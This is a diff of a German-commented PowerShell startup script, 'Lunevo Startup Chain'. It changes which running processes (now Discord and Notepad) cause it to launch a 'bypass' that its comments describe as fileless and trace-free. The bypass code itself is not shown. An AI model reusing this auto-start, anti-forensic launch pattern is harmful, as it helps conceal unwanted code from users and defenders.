@@ -1,5 +1,5 @@
 # Lunevo Startup Chain
-# Wird automatisch ausgeführt und wartet auf Discord UND Explorer UND Spotify
+# Wird automatisch ausgeführt und wartet auf Discord UND Notepad
 # Komplett fileless - keine Spuren auf Festplatte
 
 # Debug-Logging
@@ -9,7 +9,7 @@ try {
     if (-not (Test-Path $logDir)) {
         New-Item -ItemType Directory -Path $logDir -Force | Out-Null
     }
-    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] startup_chain.ps1 gestartet - Warte auf Discord + Explorer + Spotify" | Out-File -FilePath $logFile -Append -Encoding UTF8
+    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] startup_chain.ps1 gestartet - Warte auf Discord + Notepad" | Out-File -FilePath $logFile -Append -Encoding UTF8
 } catch {}
 
 # Endlosschleife - Prüft kontinuierlich
@@ -25,20 +25,19 @@ while ($true) {
             continue
         }
         
-        # Prüfe ob Discord UND Explorer UND Spotify laufen
+        # Prüfe ob Discord UND Notepad laufen
         $discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
-        $explorerRunning = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
-        $spotifyRunning = Get-Process -Name "spotify" -ErrorAction SilentlyContinue
+        $notepadRunning = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
         
         try {
-            "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Pruefung: Discord=$($discordRunning -ne $null), Explorer=$($explorerRunning -ne $null), Spotify=$($spotifyRunning -ne $null), AnyDesk=$($anydeskRunning -ne $null)" | Out-File -FilePath $logFile -Append -Encoding UTF8
+            "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Pruefung: Discord=$($discordRunning -ne $null), Notepad=$($notepadRunning -ne $null), AnyDesk=$($anydeskRunning -ne $null)" | Out-File -FilePath $logFile -Append -Encoding UTF8
         } catch {}
         
-        if ($discordRunning -and $explorerRunning -and $spotifyRunning) {
-            # Alle drei Prozesse laufen - Starte Bypass fileless
+        if ($discordRunning -and $notepadRunning) {
+            # Beide Prozesse laufen - Starte Bypass fileless
             
             try {
-                "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Alle drei Prozesse laufen - Starte Bypass" | Out-File -FilePath $logFile -Append -Encoding UTF8
+                "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Beide Prozesse laufen - Starte Bypass" | Out-File -FilePath $logFile -Append -Encoding UTF8
             } catch {}
             
             # Prüfe ob Bypass bereits läuft (verhindert mehrfaches Starten)
@@ -148,7 +147,7 @@ while ($true) {
                 }
             }
         } else {
-            # Nicht alle drei Prozesse laufen - Warte 3 Sekunden und prüfe erneut
+            # Nicht beide Prozesse laufen - Warte 3 Sekunden und prüfe erneut
             Start-Sleep -Seconds 3
         }
     } catch {
